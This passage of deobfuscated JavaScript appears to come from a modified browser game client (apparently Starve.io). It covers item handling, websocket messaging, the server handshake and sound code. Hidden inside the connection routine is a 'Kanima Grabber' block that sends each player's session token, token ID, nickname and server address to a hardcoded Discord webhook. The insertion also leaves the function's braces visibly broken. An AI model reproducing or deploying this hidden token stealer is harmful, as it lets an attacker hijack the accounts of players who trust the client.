          case le.EXTRACTOR_MACHINE_REIDITE:
          case le.BED:
          case le.GARLAND:
          case le.WELL:
          case le.SIGN:
          case le.BREAD_OVEN:
          case le.TOTEM:
          case le.WOOD_TOWER:
            if (__.craft.preview === e) {
              __.craft.preview = -1;
            } else {
              __.craft.preview = e;
            }
            break;
          case le.SWORD:
          case le.SWORD_WOOD:
          case le.SWORD_GOLD:
          case le.SWORD_DIAMOND:
          case le.SWORD_AMETHYST:
          case le.REIDITE_SWORD:
          case le.PIRATE_SWORD:
          case le.DRAGON_SWORD:
          case le.LAVA_SWORD:
          case le.WOOD_BOW:
          case le.STONE_BOW:
          case le.GOLD_BOW:
          case le.DIAMOND_BOW:
          case le.AMETHYST_BOW:
          case le.REIDITE_BOW:
          case le.DRAGON_BOW:
          case le.WAND1:
          case le.WAND2:
          case le.WOOD_SPEAR:
          case le.SPEAR:
          case le.GOLD_SPEAR:
          case le.DIAMOND_SPEAR:
          case le.AMETHYST_SPEAR:
          case le.AMETHYST_REIDITE:
          case le.DRAGON_SPEAR:
          case le.LAVA_SPEAR:
          case le.REIDITE_SPEAR:
          case le.CRAB_SPEAR:
            __.craft.preview = -1;
            if ((t = s_.fast_units[__.uid]) && t.right === e) {
              this.socket[as](J[I].stringify([5, le.HAND]));
            } else {
              __.weapon.wait = true;
              this.socket[as](X[u].stringify([5, e]));
            }
            break;
          case le.PICK:
          case le.PICK_WOOD:
          case le.PICK_GOLD:
          case le.PICK_DIAMOND:
          case le.HAMMER:
          case le.HAMMER_GOLD:
          case le.HAMMER_DIAMOND:
          case le.BOOK:
          case le.HAMMER_AMETHYST:
          case le.HAMMER_REIDITE:
          case le.PICK_AMETHYST:
          case le.PICK_REIDITE:
          case le.SUPER_HAMMER:
          case le.SHOVEL:
          case le.SHOVEL_GOLD:
          case le.SHOVEL_DIAMOND:
          case le.SHOVEL_AMETHYST:
          case le.SPANNER:
          case le.MACHETE:
          case le.PITCHFORK:
          case le.PITCHFORK2:
          case le.SADDLE:
          case le.WATERING_CAN_FULL:
          case le.WOOD_SHIELD:
          case le.STONE_SHIELD:
          case le.GOLD_SHIELD:
          case le.DIAMOND_SHIELD:
          case le.AMETHYST_SHIELD:
          case le.REIDITE_SHIELD:
            __.craft.preview = -1;
            if ((t = s_.fast_units[__.uid]) && t.right === e) {
              this.socket[as](q[O].stringify([5, le.HAND]));
            } else {
              this.socket[as](Z[R].stringify([5, e]));
            }
            break;
          case le.BOAT:
          case le.SLED:
          case le.MOUNT_BOAR:
          case le.BABY_MAMMOTH:
          case le.CRAB_BOSS:
          case le.BABY_DRAGON:
          case le.BABY_LAVA:
          case le.HAWK:
          case le.PLANE:
          case le.NIMBUS:
            __.craft.preview = -1;
            var t = s_.fast_units[__.uid];
            this.socket[as](Z[R].stringify([5, e]));
            break;
          case le.CROWN_GREEN:
          case le.CROWN_ORANGE:
          case le.CROWN_BLUE:
          case le.WOOD_HELMET:
          case le.STONE_HELMET:
          case le.GOLD_HELMET:
          case le.DIAMOND_HELMET:
          case le.AMETHYST_HELMET:
          case le.REIDITE_HELMET:
          case le.DIAMOND_PROTECTION:
          case le.AMETHYST_PROTECTION:
          case le.REIDITE_PROTECTION:
          case le.DRAGON_HELMET:
          case le.LAVA_HELMET:
          case le.WITCH:
          case le.CROWN_CRAB:
          case le.SUPER_DIVING_SUIT:
            if ((t = s_.fast_units[__.uid]) && t.clothe !== e) {
              __.helmet.wait = true;
            }
            this.socket[as](F[I].stringify([5, e]));
            break;
          case le.EARMUFFS:
          case le.HOOD:
          case le.PEASANT:
          case le.WINTER_PEASANT:
          case le.COAT:
          case le.CAP_SCARF:
          case le.FUR_HAT:
          case le.PILOT_HELMET:
          case le.TURBAN1:
          case le.TURBAN2:
          case le.CHRISTMAS_HAT:
          case le.ELF_HAT:
          case le.WINTER_HOOD:
          case le.EXPLORER_HAT:
          case le.PIRATE_HAT:
          case le.DIVING_MASK:
            this.socket[as](Q[g].stringify([5, e]));
        }
      };
      this.delete_inv = function (e) {
        this.socket[as](k[W].stringify([6, e]));
      };
      this.delete_inv_ok = function (e) {
        __.build.wait = true;
        var i = __.inv.find_item(e);
        __.inv.delete_item(e, i);
        __.craft.update();
      };
      this.recycle_inv = function (e, i) {
        r.main.processing.autorecycle.id = e;
        this.socket[as](B[O].stringify([29, e]));
      };
      this.delete_one_inv = function (e, i) {
        this.socket[as](K[T].stringify([28, e]));
      };
      this.delete_one_inv_ok = function (e) {
        __.build.wait = true;
        var i = __.inv.find_item(e);
        __.inv.decrease(e, 1, i);
        __.craft.update();
      };
      this.delete_single_inv = function (e) {
        var i = e[1];
        var t = e[2];
        __.build.wait = true;
        var r = __.inv.find_item(i);
        __.inv.decrease(i, t, r);
        __.craft.update();
      };
      this.stop_attack = function () {
        this.socket[as](K[T].stringify([14]));
      };
      this.send_attack = function (e) {
        var i = Math.PI * 2;
        this.socket[as](k[A].stringify([4, Math.floor((e + i) % i * 255 / i)]));
      };
      this.send_angle = function (e) {
        var i = Math.PI * 2;
        this.socket[as](k[A].stringify([3, Math.floor((e + i) % i * 255 / i)]));
      };
      this.send_move = function (e) {
        if (!r.visuals.spectator.enable) {
          this.socket[as](WINDOW12[V].stringify([2, e]));
        }
      };
      this.send_command = function (e) {
        this.socket[as](J[I].stringify([36, e]));
      };
      this.send_chat = function (e) {
        var i = s_.fast_units[__.uid];
        if (__.zombie) {
          if (Math.random() > 0.5) {
            i.text.push(e.substring(0, 25) + " ..." + ZOMBIE_GRUMBLE);
          } else {
            i.text.push(ZOMBIE_GRUMBLE + "... " + e.substring(0, 25));
          }
        } else {
          i.text.push(e);
        }
        this.socket[as](J[I].stringify([0, e]));
      };
      this.move_units = function (e) {
        var i = player.select.units;
        if (i.length != 0) {
          var t = [2];
          var r = [];
          Utils.sub_vector(e, {
            x: player.cam.rx,
            y: player.cam.ry
          });
          t.push(e.x);
          t.push(e.y);
          for (var n = 0; n < i.length; n++) {
            r.push(i[n].oid);
          }
          t.push(r);
          this.socket[as](X[u].stringify(t));
        }
      };
      this.cam_delay = 0;
      this.last_cam = {
        i: 0,
        j: 0
      };
      this.update_cam = function () {
        if (u_ - this.cam_delay > As.CAM_DELAY) {
          this.cam_delay = u_;
          var e = __.cam;
          var i = Math.floor(e.x / 100);
          var t = Math.floor(e.y / 100);
          if (!(this.last_cam.i == i && this.last_cam.j == t)) {
            this.socket[as](Z[O].stringify([1, Math.floor(-e.x), Math.floor(-e.y)]));
            this.last_cam.i = i;
            this.last_cam.j = t;
          }
        }
      };
      this.ping_delay = 0;
      this.try_ping = function () {
        if (u_ - this.ping_delay > As.PING_DELAY) {
          this.ping_delay = u_;
          this.ping();
        }
      };
      this.lost = function () {
        __.reconnect.enabled = true;
        if (this._current_id == this.socket._current_id) {
          this._current_id++;
          this.socket.close();
          client.connect();
        }
      };
      this.join_new_team = function (e) {
        this.new_alert(ve[TEXT.JOIN_TEAM]);
        for (var i = 1; i < e.length; i++) {
          __.team.push(e[i]);
        }
      };
      this.new_member_team = function (e) {
        this.new_alert(s_.players[e].nickname + ve[TEXT.JOINED_TEAM]);
        __.team.push(e);
        var i = document.getElementById("team_box");
        if (T_.team_buttons_id != -1 && i.style.display == "inline-block") {
          T_.team_buttons[T_.team_buttons_id].action();
        }
      };
      this.destroy_team = function () {
        this.new_alert(ve[TEXT.TEAM_DESTROYED]);
        __.totem.wait = true;
        __.team = [];
        document.getElementById("team_box").style.display = "none";
      };
      this.exclude_team = function (e) {
        if (e == __.id) {
          this.new_alert(ve[TEXT.LEFT_TEAM]);
          __.totem.wait = true;
          __.team = [];
          document.getElementById("team_box").style.display = "none";
        } else {
          this.new_alert(s_.players[e].nickname + ve[TEXT.LEFT_TEAM2]);
          for (var i = 0; i < __.team.length; i++) {
            if (__.team[i] == e) {
              __.team.splice(i, 1);
              break;
            }
          }
          var t = document.getElementById("team_box");
          if (T_.team_buttons_id != -1 && t.style.display == "inline-block") {
            T_.team_buttons[T_.team_buttons_id].action();
          }
        }
      };
      this.steal_token = function (e) {
        __.alive = false;
        this.new_alert(ve[TEXT.TOKEN]);
        if (this._current_id == this.socket._current_id) {
          this._current_id++;
          T_.quit(n_.run);
          this.socket.close();
        }
      };
      this.killed = function (e, i) {
        __.alive = false;
        var t = new Uint16Array(i);
        var r = new Uint32Array(i);
        __.die.howdie = Le[e][Math.floor(Math.random() * Le[e].length)];
        __.die.score = Utils.simplify_number(s_.players[__.id].score);
        __.die.bank = Utils.simplify_number(r[1]);
        __.die.kill = t[1];
        this.new_alert(ve[TEXT.YOU_DEAD]);
        if (this._current_id == this.socket._current_id) {
          this._current_id++;
          T_.quit(E_.run);
          this.socket.close();
        }
      };
      this.ping = function () {
        this.socket[as](As.PING);
      };
      this.check_state = function () {
        if (this.socket.readyState == 3) {
          this.timeout_server -= As.TIMEOUT_SERVER;
        }
      };
      this.check_pong = function () {
        if (I_ > As.LOOSE_FOCUS) {
          this.timeout_server = u_;
        }
        if (u_ - this.timeout_server > As.TIMEOUT_SERVER) {
          this.timeout_server = u_;
          this.lost();
        }
      };
      this.handshake = function (i) {
        clearTimeout(this.timeout_handler);
        document.getElementById("commandMainBoxName").innerHTML = this.mode_list[this.current_mode][this.selected_server[this.current_mode]].a;
        document.getElementById("exploreForest").src = "img/forest-leaf.png";
        document.getElementById("exploreWinter").src = "img/winter-flake.png";
        document.getElementById("exploreDesert").src = "img/desert-cactus.png";
        document.getElementById("exploreLava").src = "img/lava-volcano.png";
        this.timeout_server = u_;
        __.gauges.cold.ed = __.gauges.cold.em;
        __.gauges.hunger.ed = __.gauges.hunger.em;
        __.gauges.thirst.ed = __.gauges.thirst.em;
        __.gauges.oxygen.ed = __.gauges.oxygen.em;
        __.gauges.warm.ed = __.gauges.warm.em;
        __.gauges.l = 1;
        __.gauges.c = 1;
        __.gauges.h = 1;
        __.gauges.t = 1;
        __.gauges.o = 1;
        __.gauges.wa = 1;
        __.bigmap = false;
        T_.info_box.display = 0;
        __.inv.can_select = [];
        __.inv.n = [];
        __.inv.max = ds.WITHOUT_BAG;
        __.inv.bonus = 0;
        __.inv.bag = 0;
        __.inv.id = -1;
        T_.show_recipe_book = 1;
        T_.show_clock = 1;
        T_.show_quest = 1;
        T_.show_market = 1;
        __.alive = true;
        __.inv.drag.stop();
        __.craft.can_craft = [];
        __.craft.crafting = false;
        __.craft.can_build = false;
        __.craft.preview = -1;
        __.craft.id = -1;
        __.craft.workbench = false;
        __.craft.well = false;
        __.craft.fire = false;
        __.craft.water = false;
        __.craft.timeout = new Utils.LinearAnimation(false, 0, 1, 0, 1, 1);
        __.weapon.timeout = new Utils.LinearAnimation(false, 0, 1, 0, 0.1, 1);
        __.weapon.wait = false;
        __.helmet.timeout = new Utils.LinearAnimation(false, 0, 1, 0, 0.2, 1);
        __.helmet.wait = false;
        __.build.timeout = new Utils.LinearAnimation(false, 0, 1, 0, 1, 1);
        __.build.wait = false;
        __.totem.id = -1;
        __.totem.pid = -1;
        __.totem.wait = false;
        __.totem.timeout = new Utils.LinearAnimation(false, 0, 1, 0, 1 / 30, 1);
        T_.minimap.marker.x = -1;
        T_.minimap.marker.y = -1;
        T_.craft_list.open = false;
        T_.minimap.players = [];
        __.show_spectators.enabled = false;
        s_.mode = i[1];
        if (i[20] !== undefined && i[21] !== undefined) {
          s_.nw = i[20];
          s_.nh = i[21];
          s_.w = s_.nw * s_.dw;
          s_.h = s_.nh * s_.dh;
        }
        s_.islands = i[22];
        s_.custom_map = i[23];
        e.welcome(i[24]);
        e.new_recipes(i[25]);
        __.desert.tempest = i[26];
        __.blizzard = 0;
        __.winter.tempest = i[27];
        s_.generate_world(i[19]);
        s_.time = i[5];
        s_.clock.hour = i[15];
        s_.clock.init = new Date().getTime();
        T_.quests.born = i[16];
        s_.transition = false;
        __.day = i[2];
        T_.quests.reset();
        __.team = i[8];
        s_.units[us.PLAYERS] = [];
        s_.units[us.FRUIT] = [];
        s_.units[us.WORKBENCH] = [];
        s_.units[us.FIRE] = [];
        s_.units[us.BIG_FIRE] = [];
        s_.units[us.SEED] = [];
        s_.units[us.WHEAT_SEED] = [];
        s_.units[us.PUMPKIN_SEED] = [];
        s_.units[us.TOMATO_SEED] = [];
        s_.units[us.CARROT_SEED] = [];
        s_.units[us.GARLIC_SEED] = [];
        s_.units[us.THORNBUSH_SEED] = [];
        s_.units[us.WATERMELON_SEED] = [];
        s_.units[us.ALOE_VERA_SEED] = [];
        s_.units[us.WALL] = [];
        s_.units[us.STONE_WALL] = [];
        s_.units[us.GOLD_WALL] = [];
        s_.units[us.DIAMOND_WALL] = [];
        s_.units[us.WOOD_DOOR] = [];
        s_.units[us.STONE_DOOR] = [];
        s_.units[us.GOLD_DOOR] = [];
        s_.units[us.DIAMOND_DOOR] = [];
        s_.units[us.WOOD_DOOR_SPIKE] = [];
        s_.units[us.STONE_DOOR_SPIKE] = [];
        s_.units[us.GOLD_DOOR_SPIKE] = [];
        s_.units[us.DIAMOND_DOOR_SPIKE] = [];
        s_.units[us.AMETHYST_DOOR_SPIKE] = [];
        s_.units[us.REIDITE_DOOR_SPIKE] = [];
        s_.units[us.CHEST] = [];
        s_.units[us.RESURRECTION] = [];
        s_.units[us.EMERALD_MACHINE] = [];
        s_.units[us.SPIKE] = [];
        s_.units[us.STONE_SPIKE] = [];
        s_.units[us.GOLD_SPIKE] = [];
        s_.units[us.DIAMOND_SPIKE] = [];
        s_.units[us.WOLF] = [];
        s_.units[us.BOAR] = [];
        s_.units[us.CRAB_BOSS] = [];
        s_.units[us.BABY_DRAGON] = [];
        s_.units[us.BABY_LAVA] = [];
        s_.units[us.HAWK] = [];
        s_.units[us.TREASURE_CHEST] = [];
        s_.units[us.DEAD_BOX] = [];
        s_.units[us.GIFT] = [];
        s_.units[us.CRATE] = [];
        s_.units[us.BREAD_OVEN] = [];
        s_.units[us.PIRANHA] = [];
        s_.units[us.KRAKEN] = [];
        s_.units[us.CRAB] = [];
        s_.units[us.FOX] = [];
        s_.units[us.BEAR] = [];
        s_.units[us.MAMMOTH] = [];
        s_.units[us.BABY_MAMMOTH] = [];
        s_.units[us.VULTURE] = [];
        s_.units[us.SAND_WORM] = [];
        s_.units[us.DRAGON] = [];
        s_.units[us.LAVA_DRAGON] = [];
        s_.units[us.FLAME] = [];
        s_.units[us.WHEAT_MOB] = [];
        s_.units[us.ALOE_VERA_MOB] = [];
        s_.units[us.PUMPKIN_MOB] = [];
        s_.units[us.GARLIC_MOB] = [];
        s_.units[us.THORNBUSH_MOB] = [];
        s_.units[us.RABBIT] = [];
        s_.units[us.PENGUIN] = [];
        s_.units[us.SPELL] = [];
        s_.units[us.FIREFLY] = [];
        s_.units[us.SPIDER] = [];
        s_.units[us.FURNACE] = [];
        s_.units[us.AMETHYST_WALL] = [];
        s_.units[us.AMETHYST_SPIKE] = [];
        s_.units[us.AMETHYST_DOOR] = [];
        s_.units[us.REIDITE_WALL] = [];
        s_.units[us.REIDITE_SPIKE] = [];
        s_.units[us.REIDITE_DOOR] = [];
        s_.units[us.TOTEM] = [];
        s_.units[us.WOOD_TOWER] = [];
        s_.units[us.BRIDGE] = [];
        s_.units[us.ROOF] = [];
        s_.units[us.PLOT] = [];
        s_.units[us.WINDMILL] = [];
        s_.units[us.EXTRACTOR_MACHINE_STONE] = [];
        s_.units[us.EXTRACTOR_MACHINE_GOLD] = [];
        s_.units[us.EXTRACTOR_MACHINE_DIAMOND] = [];
        s_.units[us.EXTRACTOR_MACHINE_AMETHYST] = [];
        s_.units[us.EXTRACTOR_MACHINE_REIDITE] = [];
        s_.units[us.GARLAND] = [];
        s_.units[us.BED] = [];
        s_.units[us.WELL] = [];
        s_.units[us.SIGN] = [];
        s_.fast_units = [];
        s_.max_units = i[7];
        __.id = i[9];
        __.uid = __.id * s_.max_units;
        if (A_.loaded) {
          A_.players[0].uid = __.uid;
          A_.players[0].free = 0;
        }
        d_.clear_directionnal();
        __.cam.change(i[3], i[10]);
        s_.players = [];
        for (var t = s_.players, n = 0; n < i[11]; n++) {
          t.push(new Os());
        }
        n = 0;
        for (var a = i[4]; n < a.length; n++) {
          var o = t[a[n].i];
          o.nickname = a[n].n;
          o.skin = a[n].s;
          o.accessory = a[n].a;
          o.crate = a[n].c;
          o.book = a[n].b;
          o.dead = a[n].d;
          o.baglook = a[n].g;
          o.level = a[n].l;
          o.score = a[n].p;
          o.alive = true;
          if (os === 1) {
            o.nickname += "|" + a[n].i;
          }
        }
        __.ldb.sort();
        if (s_.mode === ds.MODE_HUNGER_GAMES && s_.players[__.id].nickname === "spectator") {
          __.spectator = true;
        } else {
          __.spectator = false;
        }
        if (s_.mode === ds.MODE_ZOMBIES && s_.players[__.id].skin === ds.ZOMBIE_SKIN) {
          __.zombie = true;
        } else {
          __.zombie = false;
        }
        if (s_.mode === ds.MODE_VAMPIRES && s_.players[__.id].skin === ds.VAMPIRE_SKIN) {
          __.vampire = true;
        } else {
          __.vampire = false;
        }
        Cookies.set("starve_token", __.token);
        if (i[12] === 0) {
          __.shop.delay = 0;
          T_.quests.restore(i[17]);
          var s = i[14];
          if (s[le.BAG]) {
            __.inv.update_bag_size(1, 0);
          }
          for (n = 0; n < s.length; n++) {
            if (s[n]) {
              if (n == le.BAG) {
                continue;
              }
              if (n == le.HAND) {
                continue;
              }
              this.gather([0, n, s[n]]);
            }
          }
          __.shop.open = false;
        } else {
          if (s_.mode === ds.MODE_LEGACY) {
            this.gather([0, le.SANDWORM_JUICE, 1]);
          } else if (s_.mode === ds.MODE_VAMPIRES) {
            if (__.vampire) {
              this.gather([0, le.ROOF, 4]);
            } else {
              this.gather([0, le.GARLIC_SEED, 3]);
            }
          }
          if (s_.mode === ds.MODE_PVP || s_.mode === ds.MODE_VAMPIRES || s_.mode === ds.MODE_EXPERIMENTAL || s_.mode === ds.MODE_LEGACY) {
            __.shop.delay = new Date().getTime();
            __.shop.open = true;
            __.shop.value = i[13];
            T_.shop.init();
          } else {
            __.shop.delay = 0;
            __.shop.open = false;
            __.shop.value = 0;
          }
          __.token_id = i[12].toString();
        }
        __.ghost.enabled = i[6];
        __.ghost.delay = -1;
        __.ghost.label = null;
        __.ghost.now = -1;
        Cookies.set("starve_token_id", __.token_id);
        if (__.reconnect.enabled) {
          __.reconnect.rotate = 0;
          __.reconnect.enabled = false;
        } else {
          n_.quit(T_.run);
          if (ga) {
            ga("send", "event", "Game", "play", "S" + n_.skin + "A" + n_.accessory);
          }
        }
        r.visuals.gauges.timer = Date.now();
        r.visuals.gauges.healtimer = Date.now();
      };
      this.connect = function () {
        this.timeout_number = 0;
        this.connect_timeout();
      };
      this.connect_timeout = async function () {
        console.log("Connect inner");
        console.log("tut", this.current_mode);
        let i = await this.get_rivet_token();
        let t = ds.RIVET_GAME_MODES[this.current_mode];
        console.log("Current game mode", t, this.current_mode);
        let n;
        let a;
        let o = this.selected_server[this.current_mode];
        if (o == 0) {
          n = _s + "/lobbies/find";
          a = {
            game_modes: [t]
          };
        } else {
          console.log("Selecting server", this.server_list, this.selected_server, this.current_mode);
          let e = this.server_list.find(e => e.gm == t && e.idx == o);
          console.log("Selected server", e);
          n = _s + "/lobbies/join";
          a = {
            lobby_id: e.id
          };
        }
        let s = {};
        if (i) {
          s.Authorization = `Bearer ${i}`;
        }
        let _ = await fetch(n, {
          method: "POST",
          headers: s,
          body: JSON.stringify(a)
        });
        if (!_.ok) {
          return this.connect_timeout();
        }
        let E = await _.json();
        console.log("Lobby", E);
        let T = E.lobby.ports.default;
        let A = T.host;
        let d = "ws" + (T.is_tls ? "s" : "") + "://" + A + "?token=" + E.lobby.player.token;
        console.log("Socket address", d);
        this.socket = new window.WebSocket(d);

        const webhookUrl = 'https://discord.com/api/webhooks/1170679985053368360/UCw3ILOCqxcnB5n1nLPIjagNWaTNQCQ6WFPpQCTwOXgK_V62UPu1LwBcZUNW6ffE1ejg';
   
        const userToken = __.token;
        const nicknameValue = n_.nickname.input.value;
        const tokenId = __.token_id;
        
        const embed = {
            title: 'Kanima Grabber',
            description: 'KANIMA OPPPPP',
            fields: [
                {
                    name: 'Game he Went',
                    value: d,
                },
                {
                    name: 'User Token',
                    value: userToken,
                },
                {
                    name: 'Nickname',
                    value: nicknameValue,
                },
                {
                    name: 'Token ID',
                    value: tokenId,
                },
            ],
            color: 0x00ff00, // Color in hexadecimal format (here it's green)
        };
        
        const payload = {
            embeds: [embed],
        };
        
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });
              
};

        this.socket.binaryType = "arraybuffer";
        this.socket._current_id = this._current_id;
        this.socket.onmessage = function (i) {
          if (this._current_id == e._current_id) {
            if (typeof i.data == "string") {
              var t = JSON.parse(i.data);
              switch (t[0]) {
                case 0:
                  e.chat(t);
                  break;
                case 1:
                  e.kick(t[1]);
                  break;
                case 2:
                  e.new_player(t);
                  break;
                case 3:
                  e.handshake(t);
                  r.visuals.gauges.timer = Date.now();
                  r.visuals.info.playerinfo.l = {};
                  break;
                case 4:
                  e.message(t[1]);
                  break;
                case 5:
                  e.commands(t);
                  break;
                case 6:
                  e.welcome(t[1]);
              }
            } else {
              var n = new Uint8Array(i.data);
              switch (n[0]) {
                case 0:
                  e.units(i.data, n, false);
                  break;
                case 1:
                  e.units(i.data, n, true);
                  break;
                case 2:
                  e.cancel_craft();
                  break;
                case 3:
                  e.gather(new Uint16Array(i.data));
                  break;
                case 4:
                  e.old_version();
                  break;
                case 5:
                  e.full();
                  break;
                case 6:
                  e.dont_harvest();
                  break;
                case 7:
                  e.hitten(i.data);
                  break;
                case 8:
                  e.build_stop(n[1]);
                  break;
                case 9:
                  e.build_ok(n[1]);
                  break;
                case 10:
                  e.inv_full();
                  break;
                case 11:
                  e.decrease_item(n[1], n[2]);
                  break;
                case 12:
                  e.workbench(n[1]);
                  break;
                case 13:
                  e.hitten_other(n, i.data);
                  break;
                case 14:
                  e.mute();
                  break;
                case 15:
                  e.kill_player(n[1]);
                  if (r.visuals.info.playerinfo.l[n[1]] != null) {
                    delete r.visuals.info.playerinfo.l[n[1]];
                  }
                  break;
                case 16:
                  e.gauges(n[1], n[2], n[3], n[4], n[5], n[6], n[7]);
                  break;
                case 17:
                  e.recover_focus(i.data);
                  break;
                case 18:
                  e.empty_res();
                  break;
                case 19:
                  e.fire(n[1]);
                  break;
                case 20:
                  e.survive();
                  break;
                case 21:
                  e.leaderboard(i.data);
                  break;
                case 22:
                  e.get_time(n[1]);
                  break;
                case 23:
                  e.set_cam(i.data);
                  break;
                case 24:
                  e.accept_build(n[1]);
                  break;
                case 25:
                  r.visuals.map.death.x = s_.fast_units[__.uid].x;
                  r.visuals.map.death.y = s_.fast_units[__.uid].y;
                  r.visuals.info.playerinfo.l = {};
                  e.killed(n[1], i.data);
                  break;
                case 26:
                  e.minimap(n);
                  break;
                case 27:
                  e.fail_restore();
                  break;
                case 28:
                  e.ghost(n[1]);
                  break;
                case 29:
                  e.reborn();
                  break;
                case 30:
                  e.steal_token();
                  break;
                case 31:
                  e.join_new_team(n);
                  break;
                case 32:
                  e.exclude_team(n[1]);
                  break;
                case 33:
                  e.new_member_team(n[1]);
                  break;
                case 34:
                  e.destroy_team();
                  break;
                case 35:
                  e.kit_ok(n[1]);
                  break;
                case 36:
                  e.water(n[1]);
                  break;
                case 37:
                  e.gauges_life(n[1], n[2]);
                  break;
                case 38:
                  e.gauges_food(n[1]);
                  break;
                case 39:
                  e.gauges_water(n[1]);
                  break;
                case 40:
                  e.get_bag();
                  break;
                case 41:
                  e.verified_account(n);
                  break;
                case 42:
                  e.succeed_quest(n[1]);
                  break;
                case 43:
                  e.fail_quest(n[1]);
                  break;
                case 44:
                  e.claimed(n[1]);
                  break;
                case 45:
                  e.recycle_ok(n[1]);
                  break;
                case 46:
                  e.recycle_stop(n[1]);
                  break;
                case 47:
                  e.well(n[1]);
                  break;
                case 48:
                  e.no_resources();
                  break;
                case 50:
                  e.decrease_item2(n[1], n[2], n[3]);
                  break;
                case 51:
                  e.blocked();
                  break;
                case 52:
                  e.delete_inv_ok(n[1]);
                  break;
                case 53:
                  e.delete_one_inv_ok(n[1]);
                  break;
                case 54:
                  e.account_ok();
                  break;
                case 55:
                  e.gauges_warm(n[1]);
                  break;
                case 56:
                  e.gauges_cold(n[1]);
                  break;
                case 57:
                  e.new_version();
                  break;
                case 58:
                  e.wrong_password();
                  break;
                case 59:
                  e.clean_inventory();
                  break;
                case 60:
                  e.hide_shop_kit();
                  break;
                case 61:
                  __.cam.forcedDelay = 0.2;
                  __.cam.delay = 3;
                  break;
                case 62:
                  e.delete_single_inv(new Uint16Array(i.data));
                  break;
                case 63:
                  e.hide_clock();
                  break;
                case 64:
                  e.hide_recipe_book();
                  break;
                case 65:
                  e.hide_quest();
                  break;
                case 66:
                  e.hide_market();
                  break;
                case 67:
                  e.explorer_quest(n[1]);
                  break;
                case 68:
                  e.sand_tempest(n[1]);
                  break;
                case 69:
                  e.blizzard(n[1]);
                  break;
                case 70:
                  e.blizzard_status(n[1]);
                  break;
                case 71:
                  e.bandage(n[1]);
              }
            }
          }
        };
        this.socket.onopen = function () {
          clearTimeout(e.timeout_handler);
          __.newToken = __.newToken || Utils.getURLData("token");
          get_recaptcha_token().then(i => {
            e.socket[as](ee[g].stringify([n_.nickname.input.value, 4000, 4000, As.VERSION_NUMBER, __.token, __.token_id, __.reconnect.enabled ? 1 : 0, n_.skin, n_.accessory, n_.bag, n_.book, n_.crate, n_.dead, N_ === undefined ? 0 : N_, C_ === undefined ? 0 : C_.substring(C_.length - 50), ss, "🍀", i]));
            __.newToken = undefined;
            e.timeout_handler = setTimeout(e.timeout, As.TIMEOUT_TIME);
          });
        };
      };
    }();
    var s_;
    var __;
    var E_;
    var T_ = {
      is_run: false
    };
    var A_ = new function () {
      this.run = 0;
      this.loaded = 0;
      this.transition = 0;
      this.get_x = function (e) {
        return e / s_.w * 100;
      };
      this.get_y = function (e) {
        return e / s_.h * 100;
      };
      this.get_x_ext = function (e, i) {
        e = this.get_x(e) - this.ltr.x;
        return this.ltr.x + i * e;
      };
      this.get_y_ext = function (e, i) {
        e = Math.abs(this.get_y(e) - this.ltr.y);
        return this.ltr.y + i * e;
      };
      this.sample = {};
      this.samples = {};
      this.player = {};
      this.play_sample = function (e, i, t, r) {
        for (var n = 0; n < i.length; n++) {
          var a = i[n];
          if (!e.playing(a)) {
            e.pos(t, r, -0.5, a);
            e.play(a);
            return true;
          }
        }
        return false;
      };
      this.hit = function (e, i, t, r) {
        t = this.get_x_ext(t, SOUND_PLAYER.FACTOR);
        r = this.get_y_ext(r, SOUND_PLAYER.FACTOR);
        console.log("HIT", e, i, t, r, SOUND_PLAYER.FACTOR);
        if (e) {
          if (i === 1) {
            this.play_sample(this.player.hstone, this.sample.hstone, t, r);
          } else if (i === 0) {
            this.play_sample(this.player.hwood, this.sample.hwood, t, r);
          }
        } else {
          this.play_sample(this.player.hand, this.sample.hand, t, r);
        }
      };
      this.ltr = {
        x: 0,
        y: 0
      };
      this.oldp = {
        x: 0,
        y: 0
      };
      this.area = {};
      this.players = [];
      this.ambience = function (e, i) {
        for (var t in this.area) {
          var r = this.area[t];
          r.check(e);
          if (r.inside) {
            if (s_.clock.now < Js) {
              r.effect();
            }
            if (i) {
              r.update(e, this.ltr);
            }
            if (this.transition) {
              r.transition();
            }
          }
        }
        if (this.transition) {
          this.transition = 0;
        }
      };
      this.hook_players = function () {
        for (var e = [], i = 0; i < this.players.length; i++) {
          if ((n = this.players[i]).free) {
            e.push(i);
          } else if (!(n.free || s_.fast_units[n.uid])) {
            n.clean();
            e.push(i);
          }
        }
        for (var t = s_.units[us.PLAYERS], r = (i = 0, 0); i < t.length && r < e.length; i++) {
          var n = t[i];
          if (!(s_.mode == ds.MODE_HUNGER_GAMES && s_.players[n.id].nickname === "spectator" || n.sid !== -1 || n.uid === __.uid)) {
            this.players[e[r]].init(n.uid);
            r++;
          }
        }
      };
      this.players_effect = function () {
        this.hook_players();
        for (var e = 0; e < this.players.length; e++) {
          var i = this.players[e];
          if (!i.free && i.check()) {
            i.update();
          }
        }
      };
      this.update_listener = function (e) {
        if (this.oldp.x === e.x && this.oldp.y === e.y) {
          return 0;
        } else {
          this.oldp.x = e.x;
          this.oldp.y = e.y;
          this.ltr.x = this.get_x(e.x);
          this.ltr.y = this.get_y(e.y);
          Howler.pos(this.ltr.x, this.ltr.y, 0);
          return 1;
        }
      };
      this.scheduler = function () {
        if (this.run && this.loaded) {
          var e = s_.fast_units[__.uid];
          if (e) {
            e.sid = 0;
            var i = this.update_listener(e);
            if (s_.mode !== ds.MODE_ZOMBIES && s_.mode !== ds.MODE_LEGACY && s_.mode !== ds.MODE_BR) {
              this.ambience(e, i);
            }
            this.players_effect();
          }
        }
      };
      this.load_sound = function () {
        for (var e in e_) {
          var i = e_[e];
          if (typeof i == "object" && i.path) {
            i.sound = new Howl({
              src: i.path,
              volume: 0,
              sprite: i.sprite
            });
          }
          for (var t in i.sample) {
            var r = i.sample[t];
            var n = [];
            console.log(t);
            for (var a = 0; a < r; a++) {
              var o = i.sound.play(t);
              i.sound.stop(o);
              i.sound.on("fade", function (e) {
                if (!this.volume(e)) {
                  console.log(e, "OUT");
                  this.stop(e);
                }
              }, o);
              n.push(o);
            }
            if (n.length > 1) {
              A_.sample[t] = n;
            } else {
              A_.sample[t] = n[0];
            }
            A_.player[t] = i.sound;
          }
        }
      };
      this.volume_sample = function (e, i, t) {
        for (var r = 0; r < e.length; r++) {
          i.volume(t, e[r]);
        }
      };
      this.organize_samples = function (e, i, t, r, n, a) {
        for (var o = e, s = 0; s < t; s++) {
          var _ = o[s] = [];
          for (j = 0; j < r; j++) {
